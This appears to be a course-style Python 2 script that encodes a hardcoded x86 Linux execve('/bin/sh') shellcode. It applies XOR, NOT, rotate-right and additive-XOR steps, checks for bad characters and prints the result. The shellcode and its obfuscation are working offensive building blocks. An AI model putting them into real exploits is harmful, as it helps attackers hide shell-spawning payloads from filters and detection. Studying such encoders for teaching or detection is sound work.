#!/usr/bin/env python
# Author	: RIZAL MUHAMMED(UB3RSiCK)
# Description	: XNRR3AX Encoder
# Filename 	: xnrr3ax-encoder.py
# XOR, NOT, ROTATE RIGHT 3, ADDITIVE XOR Encoder

from collections import deque
import sys

# Shellcode dumped from the execve /bin/sh
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Insert bad characters in this list
badchars = [r"\x00"]

encoded_shellcode = ""
encoded_shellcode2 = ""

temp_shellcode = []

for x in bytearray(shellcode):

	# XOR with 0xAA	
	xorred = x^0xAA
	# Applying NOT
	negated = ~xorred

	temp_shellcode.append(int('0x'+'%02x'%(negated & 0xff), 16))

# Convert temp_shellcode list to Deque
dq_es = deque(temp_shellcode)
# Rotate Right 3 times 
dq_es.rotate(3)

bas = list(dq_es)

# Additive XOR

encoded_shellcode += "0x"
encoded_shellcode += "%02x," % bas[0]

encoded_shellcode2 += r"\x"
encoded_shellcode2 += "%02x" % bas[0]

for idx in range(len(bas)-1):
	
	if idx == 0:
		prev_xor = bas[idx]
	
	# XOR next byte with previous xor result	
	xorred = prev_xor^bas[idx+1]
	prev_xor = xorred
		
	encoded_shellcode += "0x"
	encoded_shellcode += "%02x," % (xorred)

	encoded_shellcode2 += r"\x"
	encoded_shellcode2 += "%02x" % (xorred)

# check for bad characters in encoded shellcode 
for badchar in badchars:
	if badchar.lower() in encoded_shellcode2:
		print r"Bad character {} in Shellcode".format(badchar)
		sys.exit()
	
print 'Encoded Opt_1 : ', encoded_shellcode2
print 'Encoded Opt_2 : ', encoded_shellcode.rstrip(',')


